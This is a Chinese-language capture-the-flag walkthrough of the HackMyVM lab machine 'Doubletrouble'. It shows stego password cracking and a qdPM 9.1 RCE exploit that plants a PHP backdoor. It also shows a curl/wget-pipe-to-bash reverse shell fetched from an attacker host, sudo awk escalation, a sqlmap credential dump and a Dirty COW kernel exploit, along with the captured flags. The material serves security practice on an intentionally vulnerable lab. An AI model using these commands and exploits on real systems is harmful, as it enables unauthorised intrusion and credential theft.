# Doubletrouble

2024.12.31 https://hackmyvm.eu/machines/machine.php?vm=Doubletrouble

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先访问 80 web 服务，发现主页上是 qdPM 9.1 , 目录扫描发现了一个好像有内容的图片 http://192.168.5.40/secret/doubletrouble.jpg 查看其是否有隐写：

```
stegseek --crack doubletrouble.jpg /usr/share/wordlists/rockyou.txt

[i] Found passphrase: "92camaro"
[i] Original filename: "creds.txt".
```

发现隐写，内容为：

```
otisrush@localhost.com
otis666
```

应该是 80 上的 web 系统的登陆凭据，尝试登陆，登陆成功，qdPM 9.1 存在 rce 漏洞，进行利用：

```
python3 50175.py -url http://192.168.5.40/ -u 'otisrush@localhost.com' -p otis666

http://192.168.5.40/uploads/users/473034-backdoor.php?cmd=whoami
```

生成了后门，kali 建立监听，执行反弹获得 shell：

```
nc -lvnp 8888
curl -d 'cmd=wget -q -O - http://192.168.5.3/5-3/8888.sh|bash' http://192.168.5.40/uploads/users/473034-backdoor.php
```

得到 shell 后，进行枚举，sudo -l 发现：

```
(ALL : ALL) NOPASSWD: /usr/bin/awk
```

直接提权到 root：

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

但是在 root 目录下，还有一个虚拟机文件 doubletrouble.ova 395M，将其下载下来，导入到虚拟机中继续运行。

新 ip 为: 192.168.5.39

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先访问 80 web 服务，是个登陆窗口，目录扫描也没发现其他的隐藏目录，尝试登陆窗口是否有弱密码或者 sql 注入，经过 sqlmap 跑出了 sql 注入，直接爆库：

```
sqlmap -r req.txt --batch -D doubletrouble -T users --dump

+----------+----------+
| password | username |
+----------+----------+
| GfsZxc1  | montreux |
| ZubZub99 | clapton  |
+----------+----------+
```

发现 clapton:ZubZub99 可以直接 ssh 登陆，获得了 user flag：

```
clapton@doubletrouble:~$ cat user.txt
6CEA7A737C7C651F6DA7669109B5FB52
```

提权至 root，没找到其他路径，直接内核提权 40839.cow.c，最终获得了 root flag：

```
firefart@doubletrouble:~# cat root.txt
1B8EEA89EA92CECB931E3CC25AA8DE21
```
